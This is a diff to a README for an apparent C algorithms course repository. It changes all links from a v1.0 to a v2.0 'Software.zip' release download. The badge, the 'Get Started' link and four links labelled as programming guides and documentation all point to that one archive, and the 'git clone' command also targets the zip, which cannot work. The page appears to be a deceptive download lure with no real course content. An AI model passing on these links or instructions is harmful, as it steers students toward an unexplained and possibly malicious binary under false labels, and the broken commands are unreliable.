@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "C Algorithms Practical Work 2025" Repository! 📚
 
-![C Algorithms Practical Work 2025](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip%20Algorithms%20Practical%20Work-2025-brightgreen)
+![C Algorithms Practical Work 2025](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip%20Algorithms%20Practical%20Work-2025-brightgreen)
 
 ## Repository Description
 This repository serves as a practical work space for the Algorithms and Data Structures course in C language at the National University of La Matanza (@unlam). Here you will find various C algorithms and data structures implementations, all geared towards enhancing your understanding and skills in this domain.
@@ -21,21 +21,21 @@ This repository serves as a practical work space for the Algorithms and Data Str
 
 ## Get Started
 To get started with the practical work for the Algorithms and Data Structures course, download the necessary resources by clicking on the following link: 
-[Launch Practical Work Resource](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip)
+[Launch Practical Work Resource](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip)
 
 If you encounter any issues with the provided link, make sure to check the "Releases" section of this repository for alternative resources.
 
 ## Resources
 Here are some helpful resources to assist you on your practical work journey:
-- [C Programming Guide](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip)
-- [Data Structures in C](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip)
-- [Algorithms Visualizations](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip)
-- [Github Actions Documentation](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip)
+- [C Programming Guide](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip)
+- [Data Structures in C](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip)
+- [Algorithms Visualizations](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip)
+- [Github Actions Documentation](https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip)
 
 ## How to Use
 1. Clone the repository to your local machine using the command:
    ```
-   git clone https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v1.0/Software.zip
+   git clone https://github.com/james99/C-Algorithms-Practical-Work-2025/releases/download/v2.0/Software.zip
    ```
 
 2. Compile the C programs using GCC compiler:
